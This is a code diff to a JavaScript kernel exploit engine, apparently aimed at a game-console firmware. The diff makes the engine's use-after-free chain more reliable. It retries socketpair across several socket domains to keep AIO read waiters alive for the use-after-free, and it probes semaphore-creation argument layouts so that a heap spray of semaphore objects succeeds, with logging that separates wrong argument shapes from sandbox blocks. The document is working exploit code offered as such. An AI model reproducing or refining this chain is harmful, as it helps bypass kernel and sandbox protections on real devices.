@@ -155,6 +155,7 @@ export function makeBagagwaEngine(X) {
         uafRequestIdx:   -1,
         osemHandles:     [],
         osemSprayIds:    [],
+        osemShape:       null,
         leakedAddrs:     [],
         targetOsemAddr:  null,
         targetOsemIdx:   -1,
@@ -371,17 +372,32 @@ export function makeBagagwaEngine(X) {
         for (let i = 0; i < 4 * NREQ; i++) states.u8[i] = 0;
 
         w32(sv.u8, 0, 0); w32(sv.u8, 4, 0);
-        const spR = await sys(SYS_SOCKETPAIR, 1, 1, 0, sv.base);
-        note("[FALLBACK] socketpair ret=" + spR.s32 + " err=" + spR.errText);
+        // socketpair(domain,type,proto,sv). 13.60 returned EPERM for
+        // AF_UNIX/SOCK_STREAM; try every cheap layout before degenerating to
+        // fd 0 (fd 0 has no pending read -> no live AIO waiters -> no UAF).
+        const spLayouts = [
+            [1, 1, "AF_UNIX,SOCK_STREAM"],
+            [1, 2, "AF_UNIX,SOCK_DGRAM"],
+            [2, 1, "AF_INET,SOCK_STREAM"],
+            [2, 2, "AF_INET,SOCK_DGRAM"],
+        ];
+        let spR = null;
+        for (const L of spLayouts) {
+            w32(sv.u8, 0, 0); w32(sv.u8, 4, 0);
+            const rr = await sys(SYS_SOCKETPAIR, L[0], L[1], 0, sv.base);
+            note("[FALLBACK] socketpair(" + L[2] + ") ret=" + rr.s32 + " err=" + rr.errText);
+            spR = rr;
+            if (!rr.failed) break;
+        }
         let fdTarget = 0, fdPair = -1;
-        if (!spR.failed) {
+        if (spR && !spR.failed) {
             fdTarget = r32(sv.u8, 0) | 0;
             fdPair = r32(sv.u8, 4) | 0;
             S.fallbackFds = [fdTarget, fdPair];
             track(fdTarget); track(fdPair);
             note("[FALLBACK] socketpair fds: " + fdTarget + "," + fdPair + " (pending read fd=" + fdTarget + ")");
         } else {
-            note("[FALLBACK] socketpair failed, using fd 0 fallback");
+            note("[FALLBACK] socketpair EPERM on all domains, using fd 0 fallback (UAF may stay latent)");
         }
         for (let i = 0; i < NREQ; i++) w32(reqs.u8, i * REQ_BYTES + 0x20, fdTarget);
 
@@ -420,6 +436,44 @@ export function makeBagagwaEngine(X) {
         return { ok: true, detail: "submit_cmd+wait5 ids=" + S.aioRequests.map(x => x.id).join(",") };
     }
 
+    // OSEM_CREATE (0x225) has the sceKernel-style semaphore ABI:
+    //   (name*, attr, init, max, opt)
+    // PSAUTO osem_campaign_1320.js session-1 found the winning shape is the
+    // 5-arg form (name*, attr=0, init=1, max=1, opt=0); attr!=0 -> EINVAL.
+    // Matches the known-good reference payloads/bagagwa_uaf_psaito.js:222.
+    // The old 2-arg call (name, attrBuf) left init/max/opt filled from stale
+    // chain registers, which 13.60 rejects with EPERM. Probe every documented
+    // shape so the log distinguishes a wrong-shape failure from a real
+    // sandbox gate (all shapes EPERM = sandbox).
+    async function pickOsemShape(nameBuf) {
+        const nm = "bgw_probe";
+        for (let c = 0; c < nm.length; c++) nameBuf.u8[c] = nm.charCodeAt(c);
+        nameBuf.u8[nm.length] = 0;
+
+        const shapes = [
+            { tag: "(nm,0,1,1,0)", args: (nb) => [nb.base, 0, 1, 1, 0] },
+            { tag: "(nm,0,0,0,0)", args: (nb) => [nb.base, 0, 0, 0, 0] },
+            { tag: "(nm,0,1,1)", args: (nb) => [nb.base, 0, 1, 1] },
+        ];
+        for (let s = 0; s < shapes.length; s++) {
+            const sh = shapes[s];
+            let r;
+            try {
+                r = await sys.apply(null, [SYS_OSEM_CREATE].concat(sh.args(nameBuf)));
+            } catch (e) {
+                note("[OSEM-PROBE] shape " + s + " " + sh.tag + " threw: " +
+                    (e && e.message ? e.message : e));
+                continue;
+            }
+            note("[OSEM-PROBE] shape " + s + " " + sh.tag + " -> ret=" + r.s32 + " err=" + r.errText);
+            if (!r.failed) {
+                note("[OSEM-PROBE] WINNING shape " + s + " " + sh.tag);
+                return sh;
+            }
+        }
+        return null;
+    }
+
     async function sprayOsem(count, batchSize) {
         const n = count || OSEM_SPRAY_COUNT;
         const batch = batchSize || OSEM_SPRAY_BATCH;
@@ -427,11 +481,15 @@ export function makeBagagwaEngine(X) {
         let created = 0;
 
         const nameBuf = safeAlloc(32, "osem-name");
-        const attrBuf = safeAlloc(0x20, "osem-attr");
-        if (!nameBuf || !attrBuf) return { ok: false, count: 0, handles: [], why: "osem name/attr OOM (arena exhausted)" };
-        w32(attrBuf.u8, 0x00, 1);
-        w32(attrBuf.u8, 0x04, 0);
-        w32(attrBuf.u8, 0x08, 1);
+        if (!nameBuf) return { ok: false, count: 0, handles: [], why: "osem name buffer OOM (arena exhausted)" };
+
+        const shape = S.osemShape || await pickOsemShape(nameBuf);
+        if (!shape) {
+            note("OSEM_CREATE rejected on every documented shape -> sandbox gate, not a shape error");
+            flushMark("BAGAGWA-OSEM-SPRAY", "created=0-target=" + n + "-why=all-shapes-rejected");
+            return { ok: false, count: 0, handles: [], why: "OSEM_CREATE EPERM/EINVAL on all shapes (sandbox gate)" };
+        }
+        S.osemShape = shape;
 
         for (let base = 0; base < n; base += batch) {
             const nb = Math.min(batch, n - base);
@@ -441,7 +499,7 @@ export function makeBagagwaEngine(X) {
                     nameBuf.u8[c] = nameStr.charCodeAt(c);
                 nameBuf.u8[nameStr.length] = 0;
 
-                const r = await sys(SYS_OSEM_CREATE, nameBuf.base, attrBuf.base);
+                const r = await sys.apply(null, [SYS_OSEM_CREATE].concat(shape.args(nameBuf)));
                 if (r.failed) {
                     note("osem_create failed at index " + (base + i) + ": " + r.errText);
                     break;
